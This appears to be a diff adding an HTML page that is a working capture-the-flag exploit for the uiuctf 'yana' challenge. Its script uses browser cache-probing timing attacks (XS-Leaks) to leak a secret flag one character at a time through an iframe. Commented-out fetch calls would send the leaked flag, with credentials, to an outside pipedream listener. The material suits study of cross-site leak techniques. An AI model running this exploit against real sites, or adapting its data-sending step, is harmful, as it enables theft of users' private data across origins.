@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>yana</title>
+</head>
+
+<body></body>
+<script>
+var chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~ ';
+var iframe = document.createElement('iframe');
+document.body.appendChild(iframe);
+iframe.src = "http://chal.yana.wtf/#";
+checker = open("about:blank");
+
+// copypasta from https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller
+async function ifCached(url, purge = false) {
+    var controller = new AbortController();
+    var signal = controller.signal;
+    // After 9ms, abort the request (before the request was finished).
+    // The timeout might need to be adjusted for the attack to work properly.
+    // Purging content seems to take slightly less time than probing
+    var wait_time = (purge) ? 1 : 3;
+    var timeout = await setTimeout(() => {
+        controller.abort();
+    }, wait_time);
+    try {
+        // credentials option is needed for Firefox
+        let options = {
+            mode: "no-cors",
+            credentials: "include",
+            signal: signal
+        };
+        // If the option "cache: reload" is set, the browser will purge
+        // the resource from the browser cache
+        if(purge) options.cache = "reload";
+
+        await fetch(url, options);
+    } catch (err) {
+        // When controller.abort() is called, the fetch will throw an Exception
+        if(purge) console.log("The resource was purged from the cache");
+        else console.log("The resource is not cached");
+        return false
+    }
+    // clearTimeout will only be called if this line was reached in less than
+    // wait_time which means that the resource must have arrived from the cache
+    clearTimeout(timeout);
+    console.log("The resource is cached");
+
+    return true;
+}
+
+async function ifCached(url, purge = false) {
+  return new Promise(resolve => {
+    checker.location = url;
+    // timeout = (purge) ? 2 : 6;
+
+    // Cache only
+    setTimeout(() => {
+      checker.stop();
+    }, 3);
+
+    // Get result
+    setTimeout(() => {
+      try {
+        if (checker.location.href !== "about:blank") {
+          // Origin has changed
+          resolve(true);
+          checker.location = "about:blank";
+        }
+      } catch {
+        // No permission for origin
+        resolve(true);
+        checker.location = "about:blank";
+      }
+      resolve(false);
+    }, 9);
+  });
+}
+
+async function search() {
+    var leak = "uiuctf{";
+
+    while (leak[leak.length - 1] !== '}') {
+        var found = '';
+        for (var i = 0; i < chars.length; i++) {
+            curr_char = chars[i];
+
+            // purge the 'found' png from the cache
+            await ifCached('http://sigpwny.com/uiuctf/y.png', true);
+
+            // wait until iframe loads
+            iframe.src = "http://chal.yana.wtf/#" + leak + curr_char;
+            await new Promise(resolve => setTimeout(resolve, 200));
+            // iframe.remove();
+
+            // check if png is in the cache
+            var is_cached = await ifCached('http://sigpwny.com/uiuctf/y.png');
+
+            if (is_cached) {
+                console.log("[*] Found character: " + curr_char)
+                found = curr_char
+                break;
+            }
+        }
+        if (found !== '') {
+            leak += found;
+
+            // send flag back to our listener
+            // fetch('https://enkfwob9i9mvw80.m.pipedream.net?' + escape(leak), {
+            //     method: "POST",
+            //     mode: "no-cors",
+            //     credentials: "include"
+            // });
+        } else {
+            console.log("[!] Something went wrong...");
+            break;
+        }
+    }
+
+    console.log("[>] FLAG: " + leak);
+
+    // send flag back to our listener
+    // fetch('https://enkfwob9i9mvw80.m.pipedream.net?' + escape(leak), {
+    //     method: "POST",
+    //     mode: "no-cors",
+    //     credentials: "include"
+    // });
+}
+
+search();
+</script>
+
+</html>
+
+
